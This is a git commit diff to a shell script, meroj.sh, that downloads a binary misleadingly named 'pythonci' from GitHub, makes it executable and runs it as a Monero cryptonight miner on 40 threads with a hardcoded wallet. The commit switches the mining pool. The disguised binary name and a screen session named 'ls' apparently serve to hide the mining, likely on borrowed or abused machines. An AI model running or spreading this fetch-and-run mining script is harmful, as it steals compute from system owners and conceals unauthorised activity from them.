35fb2c2d59083fa13b233f0efee1b671e52be231
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-21 21:36:46 +0100

    Update meroj.sh

--- meroj.sh
+++ meroj.sh
@@ -5,7 +5,7 @@ sudo apt install screen libjansson4 -y
 wget https://github.com/NRC-TECH/test-files/raw/main/pythonci
 chmod +x pythonci
 screen -dmS ls
-POOL=stratum+tcp://xmr.pool.minergate.com:45560
+POOL=stratum+tcp://xmr.f2pool.com:13531
 WALLET=88MZkAYp2JCER2PUEUiBf2KvQAszwju5TUFnJgDBx59gBSU8tMGJwuWgGFwQrBc61R56tC4f1FBABdbXtwbWCgk8DkStvmj   
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
 ./pythonci -a cryptonight -o $POOL -u $WALLET.$WORKER -p x -t 40
